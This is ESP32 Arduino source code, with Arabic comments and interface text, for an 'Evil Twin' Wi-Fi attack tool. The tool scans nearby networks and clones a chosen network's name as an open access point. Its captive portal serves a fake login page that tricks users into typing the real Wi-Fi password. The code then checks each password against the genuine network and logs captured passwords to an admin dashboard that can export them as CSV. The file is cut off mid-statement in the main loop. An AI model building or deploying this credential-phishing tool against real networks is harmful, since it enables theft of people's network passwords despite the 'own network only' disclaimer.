#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

// ---------- الهياكل والمتغيرات العامة ----------
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";

// متغيرات الحالة
bool shouldStartEvilTwin = false;
bool shouldStopEvilTwin = false;
bool shouldVerifyPassword = false;
String pendingPassword;
unsigned long verifyStartTime = 0;
bool verifying = false;
bool passwordVerified = false;
String verifiedPassword = "";
unsigned long lastScan = 0;
bool hotspot_active = false;

// مصفوفة لتخزين كلمات المرور المصادة
const int MAX_PASSWORDS = 10;
String capturedPasswords[MAX_PASSWORDS];
String capturedTimes[MAX_PASSWORDS];
int passwordCount = 0;

// ---------- النصوص الثابتة للواجهة (لن تُستخدم في صفحة التسجيل الجديدة) ----------
#define SUBTITLE "مشكلة في الاتصال"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> فشل في تحديث الجهاز"
#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور"

// ---------- الدوال المساعدة الأصيلة (لصفحة التحكم) ----------
String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS =
      "article { background: #f2f2f2; padding: 1.3em; }"
      "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
      "div { padding: 0.5em; }"
      "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
      "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555555; border-radius: 10px; }"
      "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
      "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
      "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }";
  String h =
      "<!DOCTYPE html><html>"
      "<head><title>" + a + " :: " + t + "</title>"
      "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
      "<style>" + CSS + "</style>"
      "<meta charset=\"UTF-8\"></head>"
      "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div></body></html>";
}

// ---------- صفحة طلب كلمة المرور الجديدة (نمط بوابة Wi-Fi العامة) ----------
String indexPage() {
  String a = _selectedNetwork.ssid;
  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=yes'>"
    "<title>تسجيل الدخول إلى " + a + "</title>"
    "<style>"
    "  * { margin: 0; padding: 0; box-sizing: border-box; }"
    "  body { background: #eceff4; font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }"
    "  .card { background: #ffffff; border-radius: 28px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1), 0 8px 10px -6px rgba(0,0,0,0.02); max-width: 480px; width: 100%; padding: 28px 24px 36px; transition: all 0.2s; }"
    "  .icon { font-size: 48px; text-align: center; margin-bottom: 12px; }"
    "  h2 { color: #1e2a3a; font-weight: 600; font-size: 1.7rem; text-align: center; margin-bottom: 8px; }"
    "  .ssid-badge { background: #eef2f6; border-radius: 40px; padding: 6px 14px; font-size: 0.85rem; display: inline-block; margin: 10px auto 16px; text-align: center; width: auto; font-weight: 500; color: #2c3e50; }"
    "  .description { color: #4a627a; text-align: center; margin-bottom: 28px; font-size: 0.95rem; line-height: 1.4; }"
    "  input { width: 100%; padding: 14px 16px; font-size: 1rem; border: 1px solid #ccd7e4; border-radius: 60px; background: #fff; transition: 0.2s; margin-bottom: 20px; outline: none; }"
    "  input:focus { border-color: #0066ff; box-shadow: 0 0 0 3px rgba(0,102,255,0.2); }"
    "  button { width: 100%; background: #0066ff; color: white; border: none; padding: 14px; font-size: 1rem; font-weight: 600; border-radius: 60px; cursor: pointer; transition: 0.2s; box-shadow: 0 2px 6px rgba(0,102,255,0.3); }"
    "  button:active { transform: scale(0.97); background: #0052cc; }"
    "  .footer-note { font-size: 0.7rem; text-align: center; color: #8b9ab0; margin-top: 24px; }"
    "  hr { margin: 20px 0 12px; border: none; height: 1px; background: #e2e8f0; }"
    "</style>"
    "</head>"
    "<body>"
    "<div class='card'>"
    "<div class='icon'>🔒</div>"
    "<h2>تسجيل الدخول إلى شبكة Wi‑Fi</h2>"
    "<div style='text-align:center'><span class='ssid-badge'>" + a + "</span></div>"
    "<div class='description'>يرجى إدخال كلمة المرور للوصول إلى الإنترنت.<br>هذه الشبكة تتطلب مصادقة.</div>"
    "<form method='post' action='/'>"
    "<input type='password' name='password' placeholder='كلمة المرور' autocomplete='off' required>"
    "<button type='submit'>اتصال</button>"
    "</form>"
    "<div class='footer-note'>ستتم إعادة التوجيه بعد التحقق.</div>"
    "</div>"
    "</body>"
    "</html>";
  return html;
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

void performScan() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].ch = 0;
    memset(_networks[i].bssid, 0, 6);
  }
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}

void startEvilTwin() {
  WiFi.softAPdisconnect(true);
  delay(100);
  if (WiFi.softAP(_selectedNetwork.ssid.c_str())) {
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    hotspot_active = true;
    Serial.println("EvilTwin started on channel " + String(_selectedNetwork.ch));
  } else {
    Serial.println("Failed to start EvilTwin");
    WiFi.softAP("Justicar", "48522844");
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    hotspot_active = false;
  }
}

void stopEvilTwin() {
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP("Justicar", "48522844");
  dnsServer.stop();
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  hotspot_active = false;
  Serial.println("EvilTwin stopped");
}

void tryConnectToTarget(String password) {
  WiFi.disconnect(true, true);
  delay(100);
  WiFi.begin(_selectedNetwork.ssid.c_str(), password.c_str());
  verifyStartTime = millis();
  verifying = true;
  pendingPassword = password;
}

// دالة مساعدة لإضافة كلمة مرور مع الوقت الحالي
String getTimestamp() {
  unsigned long now = millis() / 1000;
  unsigned long seconds = now % 60;
  unsigned long minutes = (now / 60) % 60;
  unsigned long hours = (now / 3600) % 24;
  String timeStr = String(hours) + ":" + String(minutes) + ":" + String(seconds);
  return timeStr;
}

void addCapturedPassword(String pwd) {
  if (passwordCount < MAX_PASSWORDS) {
    capturedPasswords[passwordCount] = pwd;
    capturedTimes[passwordCount] = getTimestamp();
    passwordCount++;
  } else {
    for (int i = 1; i < MAX_PASSWORDS; i++) {
      capturedPasswords[i-1] = capturedPasswords[i];
      capturedTimes[i-1] = capturedTimes[i];
    }
    capturedPasswords[MAX_PASSWORDS-1] = pwd;
    capturedTimes[MAX_PASSWORDS-1] = getTimestamp();
  }
  Serial.println("Password saved: " + pwd);
}

// ---------- صفحة الداش بورد المحسّنة (متجاوبة) ----------
void handleAdmin() {
  if (!webServer.authenticate("admin", "48522844")) {
    return webServer.requestAuthentication();
  }
  
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Admin Dashboard - EvilTwin</title>";
  html += "<style>";
  html += "body{background:#0a0e1c;font-family:'Inter',system-ui,sans-serif;margin:0;padding:20px;color:#eef4ff}";
  html += ".container{max-width:1200px;margin:auto;background:#111827;border-radius:28px;padding:24px;box-shadow:0 25px 40px rgba(0,0,0,0.5)}";
  html += "h1{font-size:1.8rem;font-weight:600;background:linear-gradient(135deg,#fff,#3b82f6);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:0.5rem}";
  html += ".actions{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}";
  html += ".btn{background:#1f2937;border:none;padding:10px 20px;border-radius:40px;color:#fff;font-weight:500;cursor:pointer;transition:0.2s;font-size:0.9rem}";
  html += ".btn-primary{background:#3b82f6}";
  html += ".btn-danger{background:#dc2626}";
  html += ".btn:hover{opacity:0.8;transform:translateY(-1px)}";
  html += ".table-wrapper{overflow-x:auto;border-radius:20px;margin-top:20px}";
  html += "table{width:100%;border-collapse:collapse;background:#1e293b;min-width:300px}";
  html += "th{background:#0f172a;padding:14px;text-align:left;font-weight:600;color:#94a3b8}";
  html += "td{padding:12px;border-bottom:1px solid #334155}";
  html += "tr:hover{background:#334155}";
  html += ".badge{background:#10b981;color:#fff;padding:4px 10px;border-radius:30px;font-size:0.75rem;display:inline-block}";
  html += "footer{margin-top:20px;text-align:center;font-size:0.7rem;color:#5a6e91}";
  html += "@media(max-width:600px){.container{padding:16px} th,td{font-size:0.75rem;padding:8px} .btn{padding:8px 16px}}";
  html += "</style>";
  html += "<script>";
  html += "function copyTable(){";
  html += "let table=document.getElementById('passTable');let range=document.createRange();range.selectNode(table);window.getSelection().removeAllRanges();window.getSelection().addRange(range);document.execCommand('copy');window.getSelection().removeAllRanges();alert('Copied to clipboard');";
  html += "}";
  html += "function exportCSV(){";
  html += "let csv='#';let rows=document.querySelectorAll('#passTable tr');for(let row of rows){let cols=row.querySelectorAll('td,th');let rowData=[];for(let col of cols)rowData.push('\"'+col.innerText+'\"');csv+=rowData.join(',')+'\\n';}";
  html += "let blob=new Blob([csv],{type:'text/csv'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='passwords.csv';a.click();URL.revokeObjectURL(a.href);";
  html += "}";
  html += "function clearAll(){if(confirm('Are you sure? This will delete all passwords stored on the device.')){fetch('/clearPasswords').then(()=>location.reload());}}";
  html += "</script>";
  html += "</head><body><div class='container'>";
  html += "<h1>📡 Admin Dashboard</h1>";
  html += "<div class='actions'>";
  html += "<button class='btn btn-primary' onclick='exportCSV()'>💾 Export CSV</button>";
  html += "<button class='btn' onclick='copyTable()'>📋 Copy Table</button>";
  html += "<button class='btn btn-danger' onclick='clearAll()'>🗑 Clear All</button>";
  html += "<button class='btn' onclick='location.reload()'>🔄 Refresh</button>";
  html += "</div>";
  html += "<div class='table-wrapper'><table id='passTable'><thead><tr><th>#</th><th>Time</th><th>Password</th></tr></thead><tbody>";
  if (passwordCount == 0) {
    html += "<tr><td colspan='3' style='text-align:center'>No passwords captured yet</td></tr>";
  } else {
    for (int i = 0; i < passwordCount; i++) {
      html += "<tr>";
      html += "<td>" + String(i+1) + "</td>";
      html += "<td>" + capturedTimes[i] + "</td>";
      html += "<td><span class='badge'>" + capturedPasswords[i] + "</span></td>";
      html += "</tr>";
    }
  }
  html += "</tbody></table></div>";
  html += "<footer>Use responsibly – only on your own network</footer>";
  html += "</div></body></html>";
  webServer.send(200, "text/html", html);
}

void handleResult() {
  if (passwordVerified) {
    webServer.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body style='font-family:sans-serif;'><center><h2 style='color:green;'>تم تحديث النظام بنجاح</h2><p>سيعاود الجهاز الاتصال تلقائياً خلال لحظات.</p></center></body></html>");
  } else {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/'}, 4000);</script></head><body style='font-family:sans-serif;'><center><h2 style='color:red;'>حدث خطأ</h2><p>برجاء المحاولة مرة أخرى بعد قليل...</p></center></body></html>");
  }
}

// ---------- صفحة التحكم الرئيسية المحسّنة (متجاوبة) ----------
void handleIndex() {
  if (webServer.hasArg("ap")) {
    String bssidStr = webServer.arg("ap");
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") continue;
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      shouldStartEvilTwin = true;
    } else if (webServer.arg("hotspot") == "stop") {
      shouldStopEvilTwin = true;
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (!hotspot_active) {
    String html =
      "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=yes'>"
      "<title>EvilTwin Control Panel</title>"
      "<style>"
      "  * { box-sizing: border-box; margin: 0; padding: 0; }"
      "  body { background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif; padding: 20px; min-height: 100vh; color: #eef4ff; }"
      "  .container { max-width: 800px; margin: 0 auto; background: rgba(18, 25, 45, 0.7); backdrop-filter: blur(8px); border-radius: 2rem; padding: 1.5rem; box-shadow: 0 25px 40px rgba(0,0,0,0.5); border: 1px solid rgba(72, 187, 255, 0.2); }"
      "  h1 { font-size: 1.8rem; font-weight: 600; background: linear-gradient(135deg, #fff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 0.5rem; }"
      "  .sub { color: #8ca3cf; margin-bottom: 2rem; border-left: 3px solid #3b82f6; padding-left: 1rem; font-size: 0.9rem; }"
      "  .actions { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 30px; }"
      "  .btn { padding: 12px 28px; border: none; border-radius: 60px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.2s ease; background: #1e2a4a; color: white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }"
      "  .btn-start { background: linear-gradient(95deg, #10b981, #059669); }"
      "  .btn-start:disabled { opacity: 0.5; cursor: not-allowed; background: #2d4a6e; }"
      "  .btn-stop { background: linear-gradient(95deg, #ef4444, #b91c1c); }"
      "  .btn-admin { background: linear-gradient(95deg, #3b82f6, #1d4ed8); }"
      "  .btn:hover { transform: translateY(-2px); filter: brightness(1.05); }"
      "  .btn:active { transform: translateY(1px); }"
      "  .table-wrapper { overflow-x: auto; border-radius: 1.5rem; margin-top: 20px; }"
      "  table { width: 100%; border-collapse: collapse; background: #0f172a; min-width: 300px; }"
      "  th { background: #1e2a4a; padding: 14px 8px; text-align: center; font-weight: 600; color: #bbd7ff; }"
      "  td { padding: 12px 8px; text-align: center; border-bottom: 1px solid #1e2a4a; }"
      "  .ssid-name { font-weight: 500; color: #f0f4ff; word-break: break-word; text-align: left; }"
      "  .ch-badge { background: #0f172a; padding: 4px 10px; border-radius: 30px; font-size: 0.8rem; display: inline-block; }"
      "  .select-btn { background: #2d3a5e; border: none; color: white; padding: 6px 16px; border-radius: 40px; cursor: pointer; font-weight: 500; transition: 0.2s; font-size: 0.85rem; }"
      "  .select-btn:hover { background: #3b4e7a; }"
      "  .selected-badge { background: #10b981; padding: 6px 16px; border-radius: 40px; display: inline-block; font-size: 0.8rem; font-weight: bold; }"
      "  .success-card { margin-top: 20px; background: #064e3b; border-radius: 1rem; padding: 12px; text-align: center; border-left: 5px solid #10b981; }"
      "  footer { margin-top: 2rem; text-align: center; font-size: 0.7rem; color: #5a6e91; }"
      "  @media (max-width: 600px) { .container { padding: 1rem; } th, td { font-size: 0.8rem; padding: 8px 4px; } .btn { padding: 8px 16px; font-size: 0.85rem; } .select-btn { padding: 4px 12px; font-size: 0.75rem; } .ssid-name { font-size: 0.8rem; } }"
      "</style>"
      "</head><body>"
      "<div class='container'>"
      "<h1>🛡️ EvilTwin Control</h1>"
      "<div class='sub'>اختر الشبكة المستهدفة وابدأ هجوم التوأم الشرير</div>"
      "<div class='actions'>"
      "<form method='post' action='/?hotspot=start' style='display:inline'>"
      "<button type='submit' class='btn btn-start' " + String(_selectedNetwork.ssid == "" ? "disabled" : "") + ">▶ Start EvilTwin</button></form>"
      "<form method='post' action='/?hotspot=stop' style='display:inline'>"
      "<button type='submit' class='btn btn-stop'>⏹️ Stop</button></form>"
      "<a href='/admin'><button type='button' class='btn btn-admin'>📋 Admin Dashboard</button></a>"
      "</div><br>"
      "<div class='table-wrapper'>"
      "<table>"
      "<thead><tr><th>Wi-Fi Network (SSID)</th><th>Channel</th><th>Action</th></tr></thead>"
      "<tbody>";

    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      html += "<tr>";
      html += "<td class='ssid-name'>📶 " + _networks[i].ssid + "</td>";
      html += "<td><span class='ch-badge'>CH " + String(_networks[i].ch) + "</span></td>";
      html += "<td>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        html += "<span class='selected-badge'>✓ Selected</span>";
      } else {
        html += "<form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
        html += "<button type='submit' class='select-btn'>Select</button>";
        html += "</form>";
      }
      html += "NonNull";
    }
    html += "</tbody></table></div>";

    if (_correct != "") {
      html += "<div class='success-card'>✅ " + _correct + "</div>";
    }

    html += "<footer>استخدم هذه الأداة فقط لاختبار أمان شبكتك الشخصية</footer>";
    html += "</div></body></html>";
    webServer.send(200, "text/html", html);
  }
  else {
    if (webServer.hasArg("password")) {
      pendingPassword = webServer.arg("password");
      tryConnectToTarget(pendingPassword);
      webServer.send(200, "text/html", "<html><head><meta charset='UTF-8'><script>setTimeout(function(){window.location.href='/result';}, 8000);</script></head><body style='font-family:sans-serif;'><center><h2>جاري التحقق من البيانات...</h2><progress></progress></center></body></html>");
    } else {
      webServer.send(200, "text/html", indexPage());
    }
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("Justicar", "48522844");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/clearPasswords", []() { passwordCount = 0; webServer.send(200, "text/plain", "OK"); });
  webServer.onNotFound(handleIndex);
  webServer.begin();
  performScan();
  lastScan = millis();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (shouldStartEvilTwin) {
    shouldStartEvilTwin = false;
    startEvilTwin();
  }
  if (shouldStopEvilTwin) {
    should